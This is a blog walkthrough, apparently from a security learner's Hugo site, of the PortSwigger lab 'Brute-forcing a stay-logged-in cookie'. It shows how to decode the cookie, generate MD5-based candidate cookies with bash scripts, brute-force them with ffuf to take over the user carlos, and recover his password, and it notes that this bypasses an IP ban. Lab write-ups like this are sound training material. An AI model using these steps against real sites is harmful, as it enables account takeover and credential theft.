@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta name="robots" content="noai, noimageai">
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Portswigger Lab: Brute-forcing a stay-logged-in cookie  &ndash;
+        
+        Ep1cac
+    </title>
+
+    
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="SqW5hUbDk1THb+/o9+mQhLWLs67iY/ZZd8oDWaPUHPM6czrXoBrraS/IPO01ABSB34QVDeuhBD+AYGLPpecQpQ=="/>
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="KD6Cerdo1+0NOS06oSkDOIZF8ji7Vn2kVVhDx91gTCvDbqp+Aqa0eaIAu+Amv8NDoSnTy2E0pxLiIAfMFrcg5Q=="/>
+
+    
+    
+    <link type="text/css" rel="stylesheet" href=http://localhost:1313/css/styles.92a5dd122dc2f6b3f4e1ddbdc5136b6ddc6386b3fd22c6fb8daa45dad3fc4e84b98b7a7dd7949fea7fdea189c7d1adbb213c24cf54b346b49a9ac53976accd44.css integrity="sha512-kqXdEi3C9rP04d29xRNrbdxjhrP9Isb7japF2tP8ToS5i3p915Sf6n/eoYnH0a27ITwkz1SzRrSamsU5dqzNRA==" />
+<meta name="author" content="Ep1cac" />
+
+    
+        <meta name="keywords" content='Broken Authentication, Cookies, PortSwigger, Web Security' />
+    
+    
+        <meta name="description" content="&gt;Description&lt;/h3&gt;
+&lt;p&gt;The &amp;ldquo;Brute-forcing a stay-logged-in cookie&amp;rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.&lt;/p&gt;" />
+    
+
+<meta property="og:site_name"
+    content='Ep1cac' />
+
+    <meta property="og:title" content="Portswigger Lab: Brute-forcing a stay-logged-in cookie" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Ep1cac" />
+    <meta
+        property="article:published_time"
+        content='2024-09-23T10:59:43Z-0500' />
+    
+        
+            <meta property="article:tag" content="Broken Authentication" />
+        
+            <meta property="article:tag" content="Cookies" />
+        
+            <meta property="article:tag" content="PortSwigger" />
+        
+            <meta property="article:tag" content="Web Security" />
+        
+    
+    <meta property="og:url" content="http://localhost:1313/posts/cookie_brute/" />
+    
+    
+    <meta property="og:image"
+        content="http://localhost:1313/img/icon.svg" />
+    
+        <meta property="og:description" content="&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;p&gt;The &amp;ldquo;Brute-forcing a stay-logged-in cookie&amp;rdquo; lab by PortSwigger features a web application whose stay-logged" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='localhost:1313'
+/>
+<meta property="twitter:url" content="http://localhost:1313/posts/cookie_brute/" />
+
+
+    <meta name="twitter:title" content="Portswigger Lab: Brute-forcing a stay-logged-in cookie" />
+    
+    
+    
+    <meta name="twitter:image"
+        content="http://localhost:1313/img/icon.svg" />
+    
+        <meta name="twitter:description" content="&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+&lt;p&gt;The &amp;ldquo;Brute-forcing a stay-logged-in cookie&amp;rdquo; lab by PortSwigger features a web application whose stay-logged" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' alt='Logo'/>
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Ep1cac</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts/">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="/about">About</a></li>
+        
+        
+            <li><a href="/tags/">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search/?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/qihan-w-291838222/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        LinkedIn
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/Ep1cac">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Portswigger Lab: Brute-forcing a stay-logged-in cookie</h1>
+    
+    
+        <p class="date">
+            <span title='Date'>󰃭 </span>
+    2024-09-23
+
+</p>
+    
+    
+    
+    
+    <div><h3 id="description">Description</h3>
+<p>The &ldquo;Brute-forcing a stay-logged-in cookie&rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.</p>
+<h3 id="walkthrough">Walkthrough</h3>
+<p>Navigate to the login page under &ldquo;My account&rdquo;. We will first create a stay-logged-in cookie with the user credentials given to us. Make sure check &ldquo;Stay logged in&rdquo;.</p>
+<p><img src="/img/portswigger/cookie-brute/stay_logged_in.png" alt="Login and enable persistent cookies"></p>
+<p>Now we can copy the cookie to analyze. Hit <code>Ctr-Shift-i</code> to open the Developer Tools panel and head to the &ldquo;Storage&rdquo; section. The value for the &ldquo;stay-logged-on&rdquo; field is our cookie.</p>
+<p><img src="/img/portswigger/cookie-brute/stay_logged_in_cookie.png" alt="Stay-logged-in cookie"></p>
+<p>The cookie is encoded in base64. Decoding it reveals that it is composed of the our username, &ldquo;:&rdquo;, and a hash.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ echo &#39;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw&#39; | base64 -d                                    
+wiener:51dc30ddc473d43a6011e9ebba6ca770
+</code></pre><p>Given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. In this case, it&rsquo;s the MD5 hash of our password. We can confirm this by hashing our password using MD5 and verifying it is identical to the hash in our cookie.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ echo -n &#39;peter&#39; | md5sum | cut -d &#39; &#39; -f1 
+51dc30ddc473d43a6011e9ebba6ca770
+</code></pre><p>We have now determined that the stay-logged-in cookie is <code>username:&lt;password MD5 hash&gt;</code> and base64-encoded. Since we have already been given a <a href="https://portswigger.net/web-security/authentication/auth-lab-passwords">list of passwords</a>, we can create a list of potential cookies for <code>carlos</code> by applying these rules. I provided a script that does this and saves the cookies into <code>cookies.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>Now we can brute force the stay-logged-in cookie for <code>carlos</code>. Logout and start Burp Suite. We are going to login again as <code>wiener</code> again, but this time we are going to intercept our web requests. Forward the POST request but capture the GET request for your account details.</p>
+<p><img src="/img/portswigger/cookie-brute/persistent_logon.png" alt="Web request"></p>
+<p>Copy it and save it into a file. Change the <code>id</code> query string&rsquo;s value to <code>carlos</code> and replace the stay-logged-in cookie with <code>FUZZ</code>. Now, we can brute force the cookie.</p>
+<pre tabindex="0"><code>ffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:FUZZ -r
+</code></pre><p>We see a change in the webserver&rsquo;s response after supplying one of the cookies.</p>
+<p><img src="/img/portswigger/cookie-brute/success.png" alt="Cookie brute force"></p>
+<p>Now we can simply use our cookie to take over  <code>carlos</code>. Once again, we open the developer tools and head to storage &gt; cookies. Right click and add another item with the name as &ldquo;stay-logged-in&rdquo; and the value as the cookie we got.</p>
+<p><img src="/img/portswigger/cookie-brute/add_cookie.png" alt="Add carlos&rsquo; cookie"></p>
+<p>Refresh the page and we are now logged in as <code>carlos</code>.</p>
+<p><img src="/img/portswigger/cookie-brute/carlos_pwned.png" alt="Takeover success"></p>
+<hr>
+<h3 id="beyond-pwn">Beyond Pwn</h3>
+<p>Note that finding the cookie for <code>carlos</code> is similar to a password dictionary attack. In this particular though, there is a IP ban for incorrect login attempts. By brute forcing the cookie instead of password, we are able to bypass the IP ban.</p>
+<p>Also worth mentioning is that we can also get the <code>carlos</code> user&rsquo;s password while brute forcing his cookie.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># md5 hash -&gt; user:&lt;hash&gt; -&gt; base64 cookie &amp;&amp; cookie-password map</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>        hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> | md5sum | cut -d <span style="color:#e6db74">&#39; &#39;</span>  -f1<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        cookie<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;carlos:</span>$hash<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">&#34;</span> &gt;&gt; cookies.txt
+</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$cookie<span style="color:#e6db74">: </span>$line<span style="color:#e6db74">&#34;</span> &gt;&gt; map.txt
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#66d9ef">$(</span>cat pass.txt<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>Once we successfully authenticate with a cookie, we can find its corresponding password through the map.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
+└─$ grep &#39;Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx&#39; map.txt                    
+Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx: thomas
+</code></pre><p>This can be useful when checking for password reuse and may help us access more services in a real engagement.</p>
+</div>
+</article>
+
+    <hr />
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                href="/tags/broken-authentication/">#Broken Authentication</a>
+        
+            <a
+                
+                href="/tags/cookies/">#Cookies</a>
+        
+            <a
+                
+                href="/tags/portswigger/">#PortSwigger</a>
+        
+            <a
+                
+                href="/tags/web-security/">#Web Security</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+<p><small>
+        2024 &copy; Ep1cac
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
